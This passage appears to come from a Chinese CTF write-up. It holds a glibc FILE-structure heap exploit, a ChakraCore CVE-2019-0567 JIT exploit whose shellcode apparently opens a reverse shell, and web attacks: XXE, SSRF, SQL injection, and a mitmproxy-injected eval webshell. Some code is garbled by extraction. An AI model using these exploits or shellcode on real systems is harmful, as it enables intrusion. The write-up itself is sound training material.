        fake_file = p64(0xfbad2887)+p64(libc.sym['_IO_2_1_stdout_']+131)*7+p64(libc.sym['_IO_2_1_stdout_']+132)
        fake_file += p64(0)*4+p64(libc.sym['_IO_2_1_stdin_'])+p64(1)+p64(0xffffffffffffffff)+p64(0x000000000b000000)+p64(libc.address+(0x7ffff7dd3780-0x7ffff7a0d000))
        fake_file += p64(0xffffffffffffffff)+p64(0)+p64(libc.address+(0x7ffff7dd17a0-0x7ffff7a0d000))+p64(0)*3+p64(0x00000000ffffffff)+p64(0)*2 
        fake_file += p64(stdout+0xd8-0x30)+p64(libc_base+one_gadget)*2+'\n'
        if ATTACH==1:
            gdb.attach(p,'''
            b *0x555555554000+0xecd
            b *0x555555554000+0xb72
            ''')
        edit(p,4,fake_file)
        p.interactive()
    if __name__ == '__main__':
        pwn()
    # 0x45216 execve("/bin/sh", rsp+0x30, environ)
    # constraints:
    #   rax == NULL
    # 0x4526a execve("/bin/sh", rsp+0x30, environ)
    # constraints:
    #   [rsp+0x30] == NULL
    # 0xf02a4 execve("/bin/sh", rsp+0x50, environ)
    # constraints:
    #   [rsp+0x50] == NULL
    # 0xf1147 execve("/bin/sh", rsp+0x70, environ)
    # constraints:
    #   [rsp+0x70] == NULL
### childjs
Patch 复现了 chakracore 引擎的 JIT 漏洞 CVE-2019-0567，忽略 InitProto opcode 的 side
effect，导致 JIT 无法正确的识别处理 InitProto 时的类型变化，导致 Type Confusion。Exploit 使用了 Obj ->
Dataview -> Dataview 的内存布局来实现 Arbitrary R/W，最终通过覆写 memmove 的 got 地址为shellcode来
getshell
    obj = {}
    obj.a = 1;
    obj.b = 2;
    obj.c = 3;
    obj.d = 4;
    obj.e = 5;
    obj.f = 6;
    obj.g = 7;
    obj.h = 8;
    obj.i = 9;
    obj.j = 10;
    dv1 = new DataView(new ArrayBuffer(0x100));
    dv2 = new DataView(new ArrayBuffer(0x100));
    dv2.setUint32(0, 0xdead,true);
    BASE = 0x100000000;
    function hex(x) {
        return "0x" + x.toString(16);
    }
    function opt(o, proto, value){
        o.b = 1;
        let tmp = {__proto__: proto};
        o.a = value;
    }
    function main() {
        for (let i = 0; i buffer = addr (Step 4)
            dv1.setUint32(0x38, addr_lo, true);
            dv1.setUint32(0x3C, addr_hi, true);
            // read from addr (Step 5)
            return dv2.getInt32(0, true) + dv2.getInt32(4, true) * BASE;
        }
        let write64 = function(addr_lo, addr_hi, value_lo, value_hi) {
            // dv2->buffer = addr (Step 4)
            dv1.setUint32(0x38, addr_lo, true);
            dv1.setUint32(0x3C, addr_hi, true);
            // write to addr (Step 5)
            dv2.setInt32(0, value_lo, true);
            dv2.setInt32(4, value_hi, true);
        }
        // get dv2 vtable pointer
        vtable_lo = dv1.getUint32(0, true);
        vtable_hi = dv1.getUint32(4, true);
        let libc_addr = vtable_lo + vtable_hi * BASE
        let libc_base = libc_addr-(0x7ffff47cc6e0-0x00007ffff39c8000)
        // let memove_got_addr = libc_base+0xe38128 
        let memove_got_addr = libc_base+0xe53108
        print("[+] dv2.vtable pointer: "+hex(vtable_lo + vtable_hi * BASE));
        print("[+] libc base: "+hex(libc_base));
        print("[+] memmove got addr: "+hex(memove_got_addr));
        //get dv2 buffer poointer
        buf_lo=dv1.getUint32(0x38,true)
        buf_hi=dv1.getUint32(0x3C,true)
        let shelladdr = buf_lo + buf_hi * BASE
        let shellbase = shelladdr-(0x555555847360-0x00005555557d0000)
        // read first vtable entry using the R\W primitive
        print("[+] dv2.vtable content: "+hex(shelladdr));
        print("[+] shellbase: "+hex(shellbase))
        print("[+] dv2.buffer pointer: "+hex(libc_addr));
        // [+] dv2.vtable pointer: 0x7ffff49e95e0
        // [+] dv2.buffer pointer: 0x555555847360
        // [+] dv2.vtable content: 0x7ffef3d9a8e0
        // read first vtable entry using the R\W primitive
        print("[+] dv2.buffer content: "+hex(read64(buf_lo, buf_hi)));
        // write memove got
        // var shellcode = [0xb848686a,0x6e69622f,0x732f2f2f,0xe7894850,0x1697268,0x24348101,0x1010101,0x6a56f631,0x1485e08,0x894856e6,0x6ad231e6,0x50f583b];    
        var shellcode = [0x9958296a,0x6a5f026a,0x50f5e01,0xb9489748,0x8520002,0xbc9ae168,0xe6894851,0x6a5a106a,0x50f582a,0x485e036a,0x216aceff,0x75050f58,0x583b6af6,0x2fbb4899,0x2f6e6962,0x53006873,0x52e78948,0xe6894857,0x50f]; 
        print("shellcode len"+hex(shellcode.length));
        // print("[+] shellcode: "+hex(shellcode[0]));
        let offset = 0x400
        for (var i = 0; i shellcode.length)
                write64(buf_lo+offset+i*8,buf_hi,shellcode[i*2],0xdeadbeef);
            else
                write64(buf_lo+offset+i*8,buf_hi,shellcode[i*2],shellcode[i*2+1]);
        }
        write64(vtable_lo+0x4ea28,vtable_hi,buf_lo+offset,buf_hi)
        // trigger 
        var target = new Uint8Array(0x1234); 
        var bb = new Uint8Array(10); 
        target.set(bb); 
    }
    main();
## Web
首先先注册一个`**baidu.com`的域名，来绕过下面几个题的一些问题。
### rss
通过访问`**baidu.com/1.txt`来进行XXE，读取源码。  
之后构造，进行SSRF，在`$_GET['order']='title,"1")&&phpinfo()&&strcmp($a->title';`RCE
    ]>
        The Blog
        http://example.com/
        A blog about things
        Mon, 03 Feb 2014 00:00:00 -0000
            &xxe;
            http://example.com
            a post
            PI:EMAIL
            Mon, 03 Feb 2014 00:00:00 -0000
### babyblog
存在二次注入
    if(isset($_POST['title']) && isset($_POST['content']) && isset($_POST['id'])){
        foreach($sql->query("select * from article where id=" . intval($_POST['id']) . ";") as $v){
            $row = $v;
        }
        if($_SESSION['id'] == $row['userid']){
            $title = addslashes($_POST['title']);
            $content = addslashes($_POST['content']);
            $sql->query("update article set title='$title',content='$content' where title='" . $row['title'] . "';");
            exit("");
        }else{
            exit("");
        }
    }
先通过堆叠注入，insert一个VIP  
使用`insert users set username='xxx'....`绕过  
之后在使用replace.php的preg_replace 用/e RCE  
其中使用mitmproxy做中间件，解决antword链接问题
    from mitmproxy import http
    def request(flow):
        flow.request.urlencoded_form["find"] = "/e\x00"
        flow.request.urlencoded_form["replace"] = "ob_end_clean()&&eval($_POST['a'])&&ob_end_clean()"
        flow.request.urlencoded_form["regex"] = "1"
        flow.request.urlencoded_form["id"] = "21"
之后
    putenv LD_PRELOAD
    error_log
    fpm绕过basedir // 这个居然没绕过disable_function神奇
     *
     * Permission is hereby granted, free of charge, to any person obtaining a copy of
     * this software and associated documentation files (the "Software"), to deal in
     * the Software without restriction, including without limitation the rights to
     * use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies
     * of the Software, and to permit persons to whom the Software is furnished to do
     * so, subject to the following conditions:
     *
     * The above copyright notice and this permission notice shall be included in all
     * copies or substantial portions of the Software.
     *
     * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
     * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
     * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
     * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
     * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
     * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
     * SOFTWARE.
     */
    namespace Adoy\FastCGI;
    class TimedOutException extends \Exception {}
    class ForbiddenException extends \Exception {}
    /**
     * Handles communication with a FastCGI application
     *
     * @author      Pierrick Charron 
     * @version     1.0.0
     */
    class Client
    {
        const VERSION_1            = 1;
        const BEGIN_REQUEST        = 1;
        const ABORT_REQUEST        = 2;
        const END_REQUEST          = 3;
        const PARAMS               = 4;
        const STDIN                = 5;
        const STDOUT               = 6;
        const STDERR               = 7;
        const DATA                 = 8;
        const GET_VALUES           = 9;
        const GET_VALUES_RESULT    = 10;
        const UNKNOWN_TYPE         = 11;
        const MAXTYPE              = self::UNKNOWN_TYPE;
        const RESPONDER            = 1;
        const AUTHORIZER           = 2;
        const FILTER               = 3;
        const REQUEST_COMPLETE     = 0;
        const CANT_MPX_CONN        = 1;
        const OVERLOADED           = 2;
        const UNKNOWN_ROLE         = 3;
        const MAX_CONNS            = 'MAX_CONNS';
        const MAX_REQS             = 'MAX_REQS';
        const MPXS_CONNS           = 'MPXS_CONNS';
        const HEADER_LEN           = 8;
        const REQ_STATE_WRITTEN    = 1;
        const REQ_STATE_OK         = 2;
        const REQ_STATE_ERR        = 3;
        const REQ_STATE_TIMED_OUT  = 4;
        /**
         * Socket
         * @var Resource
         */
        private $_sock = null;
        /**
         * Host
         * @var String
         */
        private $_host = null;
        /**
         * Port
         * @var Integer
         */
        private $_port = null;
        /**
         * Keep Alive
         * @var Boolean
         */
        private $_keepAlive = false;
        /**
         * Outstanding request statuses keyed by request id
         *
         * Each request is an array with following form:
         *
         *  array(
         *    'state' => REQ_STATE_*
         *    'response' => null | string
         *  )
         *
         * @var array
         */
        private $_requests = array();
        /**